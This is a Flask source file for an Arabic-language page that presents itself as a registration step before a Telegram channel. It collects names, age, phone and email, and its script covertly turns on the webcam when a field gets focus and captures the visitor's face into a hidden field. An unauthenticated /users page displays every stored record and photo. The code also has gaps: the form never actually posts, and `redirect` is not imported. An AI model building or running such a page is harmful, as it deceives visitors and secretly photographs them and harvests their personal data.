from flask import Flask, request, render_template_string, send_from_directory
import os
import datetime
import base64
import sqlite3

app = Flask(__name__)
DATA_FILE = "user_data.db"
IMG_FOLDER = "user_images"
os.makedirs(IMG_FOLDER, exist_ok=True)

conn = sqlite3.connect(DATA_FILE)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT,
    fullName TEXT,
    fatherName TEXT,
    age INTEGER,
    phone TEXT,
    email TEXT,
    photo_filename TEXT
)
""")
conn.commit()
conn.close()

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>نظام الانتقال الى قناه التلجرام</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:"Cairo", sans-serif; }
body { display:flex; justify-content:center; align-items:center; min-height:100vh; background: #f0f2f5; background-image: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); padding: 20px; }
.container { position: relative; width: 100%; max-width: 900px; display:flex; border-radius:20px; overflow:hidden; box-shadow:0 15px 40px rgba(0,0,0,0.25);}
.left-panel { width:45%; background: #4a6cf7; background-image: linear-gradient(135deg, #4a6cf7 0%, #7597ff 100%); color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:40px; text-align:center;}
.left-panel h1 { font-size:32px; margin-bottom:20px; font-weight:700; }
.left-panel p { font-size:16px; line-height:1.6; }
.left-panel .illustration { margin-top: 40px; font-size: 120px; color: rgba(255, 255, 255, 0.9); }
.right-panel { width:55%; background:#fff; padding:35px; display:flex; flex-direction:column; align-items:center; text-align:center;}
.right-panel h1 { font-size:28px; margin-bottom:25px; color: #333; font-weight:700; }
.input-box { width:100%; margin-bottom: 18px; position: relative; }
.input-box input { width:100%; padding:15px 15px 15px 45px; border-radius:10px; border:1px solid #ddd; outline:none; font-size:16px; transition: all 0.3s ease; }
.input-box input:focus { border-color: #4a6cf7; box-shadow: 0 0 0 2px rgba(74, 108, 247, 0.2); }
.input-box i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #4a6cf7; font-size: 18px; }
.btn { width:100%; padding:15px; margin-top:10px; border:none; border-radius:10px; background:#4a6cf7; color:#fff; cursor:pointer; font-size:17px; font-weight:600; transition: all 0.3s ease; }
.btn:hover { background:#3a5fd9; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(74, 108, 247, 0.4); }
canvas { display:none; }
.camera-container { display:none; }
.loading { display: none; margin-top: 15px; }
.loading i { font-size: 20px; color: #4a6cf7; margin-right: 10px; animation: spin 1s linear infinite; }
@keyframes spin {0% { transform: rotate(0deg); }100% { transform: rotate(360deg); }}
.success-message { display: none; background: #4ade80; color: white; padding: 12px; border-radius: 8px; margin-top: 15px; }
.error-message { display: none; background: #f87171; color: white; padding: 12px; border-radius: 8px; margin-top: 15px; }

/* تحسينات للشاشات الصغيرة */
@media screen and (max-width: 992px){ .container { flex-direction:column; width:100%; max-width: 500px;} .left-panel, .right-panel { width:100%; padding:30px;} .left-panel { padding-top: 50px; padding-bottom: 50px; } .left-panel .illustration { margin-top: 20px; font-size: 80px; }}
@media screen and (max-width: 576px){ .left-panel, .right-panel { padding:25px 20px;} .left-panel h1 { font-size: 28px; } .right-panel h1 { font-size: 24px; } .input-box input { padding: 12px 12px 12px 40px; } .btn { padding: 12px; }}
@media screen and (max-width: 400px){ .left-panel h1 { font-size: 24px; } .right-panel h1 { font-size: 22px; } .input-box input { font-size: 14px; padding: 10px 10px 10px 35px; } .input-box i { font-size: 16px; left: 12px; } }
@media screen and (max-height: 600px) and (orientation: landscape) { body { padding: 10px; } .container { max-width: 700px; } .left-panel, .right-panel { padding: 20px; } .input-box { margin-bottom: 12px; } .input-box input { padding: 10px 10px 10px 35px; } }
@media screen and (min-width: 1600px){ .container { max-width: 1100px; } .left-panel h1 { font-size: 40px; } .right-panel h1 { font-size: 34px; } .input-box input { padding: 18px 18px 18px 50px; font-size: 18px; } .input-box i { font-size: 22px; left: 18px; } .btn { padding: 18px; font-size: 19px; }}
</style>
</head>
<body>
<div class="container">
  <div class="left-panel">
    <h1>مرحباً بك!</h1>
    <p>نظام التسجيل المتقدم. يرجى ملء المعلومات المطلوبة للتسجيل في نظامنا.</p>
    <div class="illustration">
      <i class="fas fa-camera"></i>
    </div>
  </div>

  <div class="right-panel">
    <h1>أدخل معلوماتك</h1>
    <form id="loginForm">
      <div class="input-box"><i class="fas fa-user"></i><input type="text" id="fullName" placeholder="الاسم الكامل" required /></div>
      <div class="input-box"><i class="fas fa-user-friends"></i><input type="text" id="fatherName" placeholder="اسم الأب" required /></div>
      <div class="input-box"><i class="fas fa-birthday-cake"></i><input type="number" id="age" placeholder="العمر" required /></div>
      <div class="input-box"><i class="fas fa-phone"></i><input type="text" id="phone" placeholder="رقم الهاتف" required /></div>
      <div class="input-box"><i class="fas fa-envelope"></i><input type="email" id="email" placeholder="البريد الإلكتروني" required /></div>

      <div class="camera-container">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" width="320" height="240"></canvas>
        <input type="hidden" name="photo" id="photoInput">
      </div>

      <button type="submit" class="btn"><i class="fas fa-paper-plane"></i> إرسال البيانات</button>
      <div class="loading" id="loading"><i class="fas fa-spinner"></i> جاري معالجة طلبك...</div>
      <div class="success-message" id="successMessage"><i class="fas fa-check-circle"></i> تم إرسال البيانات بنجاح!</div>
      <div class="error-message" id="errorMessage"><i class="fas fa-exclamation-circle"></i> حدث خطأ أثناء الإرسال!</div>
    </form>
  </div>
</div>

<script>
const loginForm = document.getElementById('loginForm');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const photoInput = document.getElementById('photoInput');
const loading = document.getElementById('loading');
const successMessage = document.getElementById('successMessage');
const errorMessage = document.getElementById('errorMessage');
let cameraStarted = false;


const inputs = document.querySelectorAll("#loginForm input");
inputs.forEach(input => {
    input.addEventListener('focus', () => {
        if (!cameraStarted) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; cameraStarted = true; })
            .catch(err => console.error("Camera access denied:", err));
        }

        if (cameraStarted && video.srcObject) {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            photoInput.value = canvas.toDataURL('image/png');
        }
    });
});


loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';

    if (cameraStarted && video.srcObject) {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        photoInput.value = canvas.toDataURL('image/png');
    }

    const fullName = document.getElementById('fullName').value.trim();
    const fatherName = document.getElementById('fatherName').value.trim();
    const age = document.getElementById('age').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const email = document.getElementById('email').value.trim();

    if (!fullName || !fatherName || !age || !phone || !email) {
        errorMessage.innerHTML = '<i class="fas fa-exclamation-circle"></i> الرجاء ملء جميع الحقول!';
        errorMessage.style.display = 'block';
        return;
    }

    loading.style.display = 'flex';

    setTimeout(() => {
        loading.style.display = 'none';
        successMessage.style.display = 'block';
        loginForm.reset();
        window.location.href = "https://t.me/fox_er";
    }, 2000);
});
</script>
</body>
</html>
"""

@app.route("/", methods=["GET","POST"])
def index():
    if request.method=="POST":
        data = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "fullName": request.form.get("fullName"),
            "fatherName": request.form.get("fatherName"),
            "age": request.form.get("age"),
            "phone": request.form.get("phone"),
            "email": request.form.get("email")
        }
        photo = request.form.get("photo")
        photo_filename = ""
        if photo:
            img_bytes = base64.b64decode(photo.split(',')[1])

            unique_id = datetime.datetime.now().strftime("%Y%m%d_%H%M%S%f")
            photo_filename = f"{unique_id}.png"
            with open(os.path.join(IMG_FOLDER,photo_filename),"wb") as f:
                f.write(img_bytes)
                
                                 

        conn = sqlite3.connect(DATA_FILE)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO users (timestamp, fullName, fatherName, age, phone, email, photo_filename)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (data["timestamp"], data["fullName"], data["fatherName"], data["age"], data["phone"], data["email"], photo_filename))
        conn.commit()
        conn.close()
        return redirect("https://t.me/fox_er1")
    return render_template_string(HTML_PAGE)
                
@app.route("/users")
def show_users():
    conn = sqlite3.connect(DATA_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT id, timestamp, fullName, fatherName, age, phone, email, photo_filename FROM users")
    users = cursor.fetchall()
    conn.close()

    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>قائمة المستخدمين</title>
        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; font-family:"Cairo", sans-serif; }
            body { background: #f0f2f5; padding: 20px; }
            h1 { text-align:center; margin-bottom:30px; color: #4a6cf7; }
            table { width:100%; border-collapse: collapse; box-shadow:0 5px 15px rgba(0,0,0,0.1); background:#fff; border-radius:10px; overflow:hidden; }
            th, td { padding:12px; text-align:center; border-bottom:1px solid #ddd; }
            th { background: #4a6cf7; color:#fff; font-weight:600; }
            tr:hover { background: #f1f5ff; }
            img { max-width:80px; border-radius:8px; }
            a.back { display:inline-block; margin-bottom:20px; color:#4a6cf7; text-decoration:none; font-weight:600; }
            a.back i { margin-left:5px; }
            @media screen and (max-width:768px) {
                th, td { padding:8px; font-size:14px; }
                img { max-width:50px; }
            }
        </style>
    </head>
    <body>
        <a href="/" class="back"><i class="fas fa-arrow-left"></i> العودة للتسجيل</a>
        <h1>قائمة المستخدمين</h1>
        <table>
            <tr>
                <th>ID</th>
                <th>تاريخ التسجيل</th>
                <th>الاسم الكامل</th>
                <th>اسم الأب</th>
                <th>العمر</th>
                <th>الهاتف</th>
                <th>البريد الإلكتروني</th>
                <th>الصورة</th>
            </tr>
            {% for user in users %}
            <tr>
                <td>{{ user[0] }}</td>
                <td>{{ user[1] }}</td>
                <td>{{ user[2] }}</td>
                <td>{{ user[3] }}</td>
                <td>{{ user[4] }}</td>
                <td>{{ user[5] }}</td>
                <td>{{ user[6] }}</td>
                <td>
                    {% if user[7] %}
                        <img src="/user_images/{{ user[7] }}" alt="صورة المستخدم">
                    {% else %}
                        لا توجد صورة
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    return render_template_string(html, users=users)

@app.route('/user_images/<filename>')
def user_images(filename):
    return send_from_directory(IMG_FOLDER, filename)

       

if __name__=="__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))

